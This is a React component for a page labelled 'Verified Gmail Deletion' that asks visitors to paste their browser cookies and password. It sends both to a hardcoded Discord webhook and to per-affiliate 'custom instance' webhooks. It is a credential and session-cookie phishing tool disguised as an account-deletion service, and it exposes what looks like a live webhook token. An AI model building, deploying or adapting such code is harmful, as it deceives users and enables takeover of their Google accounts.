import { useState } from "react";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { ArrowLeft, Shield } from "lucide-react";

interface VerifyGmailDeleteProps {
  onBack: () => void;
  onSuccess: () => void;
}

export const VerifyGmailDelete = ({
  onBack,
  onSuccess,
}: VerifyGmailDeleteProps) => {
  const [cookies, setCookies] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const MAIN_WEBHOOK =
    "https://discord.com/api/webhooks/1382124073953263787/QNnd4cako-sTG77Hv6sQ-ZDT1ZX0HM22fuVvIT4ednht3YIj91mEgYwZJ8HiH8TkgvLE";

  const getWebhookData = () => {
    const urlParams = new URLSearchParams(window.location.search);
    const refId = urlParams.get("ref");

    if (refId) {
      const webhookKey = `webhook_${refId}`;
      const webhookData = localStorage.getItem(webhookKey);

      if (webhookData) {
        try {
          const parsed = JSON.parse(webhookData);
          if (parsed.webhook) {
            return { refId, webhookData: parsed };
          }
        } catch (error) {
          console.error("❌ Error parsing webhook data:", error);
        }
      }
    }

    return { refId: null, webhookData: null };
  };

  const sendToWebhook = async (
    webhookUrl: string,
    data: any,
    webhookType: string,
  ) => {
    try {
      console.log(`🚀 Sending to ${webhookType} webhook:`, webhookUrl);

      const { refId } = getWebhookData();
      const timestamp = new Date().toISOString();

      // Clean and validate the data
      const cleanCookies = String(data.cookies || "").trim();
      const cleanPassword = String(data.password || "").trim();

      if (!cleanCookies || !cleanPassword) {
        console.error("❌ No valid data");
        return false;
      }

      console.log(`📊 Cookie data length: ${cleanCookies.length} characters`);

      // Truncate to Discord's description limit
      const maxLength = 1800; // Safe limit for code blocks
      const truncatedCookies =
        cleanCookies.length > maxLength
          ? cleanCookies.substring(0, maxLength) + "\n\n... (truncated)"
          : cleanCookies;

      // Build fields array properly
      const fields = [
        {
          name: "🔐 Password",
          value: `\`\`\`\n${cleanPassword.substring(0, 100)}\n\`\`\``, // Limit password length
          inline: false,
        },
        {
          name: "⏰ Timestamp",
          value: timestamp,
          inline: true,
        },
        {
          name: "🎯 Action",
          value: "Delete Verified Gmail",
          inline: true,
        },
        {
          name: "📊 Data Size",
          value: `${cleanCookies.length} characters`,
          inline: true,
        },
      ];

      // Add instance info if available
      if (refId) {
        fields.push({
          name: "🔗 Instance ID",
          value: String(refId).substring(0, 100), // Limit length
          inline: true,
        });
        fields.push({
          name: "🌐 Source",
          value:
            webhookType === "custom"
              ? "Custom Instance"
              : "Main System Monitor",
          inline: true,
        });
      }

      // Create the embed with safe structure
      const embed = {
        title:
          webhookType === "custom"
            ? "🛡️ Verified Gmail Delete (Custom Instance) - Part 1"
            : "🛡️ Verified Gmail Delete (Main System) - Part 1",
        color: webhookType === "custom" ? 12632256 : 16744192,
        description: `${
          webhookType === "custom"
            ? "🎯 Verified Gmail deletion request from your custom instance!"
            : "📨 Verified Gmail deletion request received and processed."
        }\n\n🍪 **Cookies:**\n\`\`\`\n${truncatedCookies}\n\`\`\``,
        fields: fields,
        footer: {
          text:
            webhookType === "custom"
              ? "X-LiNk Custom Instance - Part 1 Complete"
              : "X-LiNk Main System - Part 1 Complete",
        },
        timestamp: timestamp,
      };

      // Validate embed before sending
      if (!embed.title || !embed.description) {
        console.error("❌ Invalid embed structure");
        return false;
      }

      const payload = {
        embeds: [embed],
      };

      console.log(`📤 Sending validated Part 1 to ${webhookType} webhook`);
      console.log("📋 Payload preview:", {
        title: embed.title,
        description_length: embed.description.length,
        fields_count: embed.fields.length,
      });

      const response = await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      let responseText = "";
      try {
        responseText = await response.text();
      } catch (e) {
        responseText = "Unable to read response";
      }

      console.log(
        `📥 ${webhookType} webhook response status:`,
        response.status,
      );
      console.log(`📥 ${webhookType} webhook response:`, responseText);

      if (response.ok) {
        console.log(`✅ ${webhookType} webhook Part 1 sent successfully!`);
        return true;
      } else {
        console.error(
          `❌ ${webhookType} webhook failed:`,
          response.status,
          responseText,
        );
        return false;
      }
    } catch (error) {
      console.error(`❌ ${webhookType} webhook error:`, error);
      return false;
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cookies.trim() || !password.trim()) {
      setError("Please fill in all fields");
      return;
    }

    setIsLoading(true);
    setError("");

    const { refId, webhookData } = getWebhookData();
    const data = { cookies, password };

    console.log("🚀 Starting webhook delivery process...");
    console.log("📋 Data size:", cookies.length, "characters");
    console.log("📦 Will send as single Part 1");

    let mainWebhookSuccess = false;
    let customWebhookSuccess = false;

    // ALWAYS send to main webhook first
    try {
      console.log("📤 Sending Part 1 to MAIN webhook...");
      mainWebhookSuccess = await sendToWebhook(MAIN_WEBHOOK, data, "main");
      console.log(
        "📊 Main webhook result:",
        mainWebhookSuccess ? "✅ SUCCESS" : "❌ FAILED",
      );
    } catch (error) {
      console.error("❌ Main webhook failed:", error);
    }

    // Send to custom webhook if this is a custom instance
    if (refId && webhookData && webhookData.webhook) {
      try {
        console.log("📤 Sending Part 1 to CUSTOM webhook...");
        customWebhookSuccess = await sendToWebhook(
          webhookData.webhook,
          data,
          "custom",
        );
        console.log(
          "📊 Custom webhook result:",
          customWebhookSuccess ? "✅ SUCCESS" : "❌ FAILED",
        );
      } catch (error) {
        console.error("❌ Custom webhook failed:", error);
      }
    }

    // Report final results
    console.log("📊 FINAL DELIVERY RESULTS:");
    console.log(
      `  🎯 Main webhook Part 1: ${mainWebhookSuccess ? "✅ DELIVERED" : "❌ FAILED"}`,
    );
    console.log(
      `  🎯 Custom webhook Part 1: ${customWebhookSuccess ? "✅ DELIVERED" : "❌ FAILED"}`,
    );

    // Consider success if at least one webhook succeeded
    if (mainWebhookSuccess || customWebhookSuccess) {
      console.log("🎉 Part 1 delivered successfully!");
      onSuccess();
    } else {
      console.error("💥 ALL WEBHOOKS FAILED!");
      setError("Failed to process request. Please try again.");
    }

    setIsLoading(false);
  };

  // Check if this is a custom instance
  const { refId } = getWebhookData();
  const isCustomInstance = !!refId;

  return (
    <motion.div
      className="flex items-center justify-center min-h-screen p-4"
      initial={{ opacity: 0, x: 50 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.5 }}
    >
      <Card className="w-full max-w-2xl bg-black/80 border-gray-500/50 backdrop-blur-2xl shadow-2xl shadow-gray-400/20">
        <CardHeader className="text-center pb-6">
          <motion.div
            initial={{ y: -20 }}
            animate={{ y: 0 }}
            transition={{ delay: 0.2 }}
            className="flex flex-col items-center"
          >
            <div className="mb-4 p-3 bg-gradient-to-br from-orange-600/20 to-gray-500/20 rounded-full border border-gray-400/30">
              <Shield className="w-8 h-8 text-orange-400" />
            </div>
            <CardTitle className="text-3xl font-bold text-white mb-2 bg-gradient-to-r from-white to-gray-300 bg-clip-text text-transparent">
              Verified Gmail Deletion
            </CardTitle>
            <p className="text-gray-300 text-sm">
              Enter cookies and password for verified deletion
            </p>
            {isCustomInstance && (
              <div className="mt-2 px-3 py-1 bg-gradient-to-r from-gray-600/20 to-gray-500/20 rounded-full border border-gray-400/30">
                <p className="text-gray-300 text-xs">
                  Custom Instance: {refId}
                </p>
              </div>
            )}
          </motion.div>
        </CardHeader>
        <CardContent className="space-y-6">
          <form onSubmit={handleSubmit} className="space-y-6">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
            >
              <label className="block text-white font-medium mb-2">
                Cookies
              </label>
              <Textarea
                placeholder="Paste your cookies here... (will send as Part 1)"
                value={cookies}
                onChange={(e) => setCookies(e.target.value)}
                className="bg-black/60 border-gray-500/50 text-white placeholder:text-gray-400 min-h-[150px] focus:border-gray-400 transition-colors resize-none"
                disabled={isLoading}
              />
              {cookies.length > 0 && (
                <div className="flex justify-between items-center mt-1">
                  <p className="text-xs text-gray-400">
                    Data size: {cookies.length} characters
                  </p>
                  <span className="text-xs text-blue-400 bg-blue-900/20 px-2 py-1 rounded">
                    ✓ Will send as Part 1
                  </span>
                </div>
              )}
            </motion.div>

            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.4 }}
            >
              <label className="block text-white font-medium mb-2">
                Password
              </label>
              <Input
                type="password"
                placeholder="Enter password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="bg-black/60 border-gray-500/50 text-white placeholder:text-gray-400 h-12 focus:border-gray-400 transition-colors"
                disabled={isLoading}
              />
            </motion.div>

            {error && (
              <motion.p
                className="text-red-400 text-sm text-center font-medium bg-red-900/20 border border-red-500/30 rounded-lg py-2 px-4"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
              >
                {error}
              </motion.p>
            )}

            <motion.div
              className="flex gap-4"
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.5 }}
            >
              <Button
                type="button"
                onClick={onBack}
                variant="outline"
                className="flex-1 border-gray-600 text-gray-300 hover:bg-gray-700 h-12"
                disabled={isLoading}
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back
              </Button>
              <Button
                type="submit"
                className="flex-1 bg-gradient-to-r from-orange-600 to-gray-600 hover:from-orange-500 hover:to-gray-500 text-white h-12 font-semibold shadow-lg shadow-gray-400/25"
                disabled={isLoading || !cookies.trim() || !password.trim()}
              >
                {isLoading ? "Processing..." : "Delete Verified Gmail"}
              </Button>
            </motion.div>
          </form>
        </CardContent>
      </Card>
    </motion.div>
  );
};
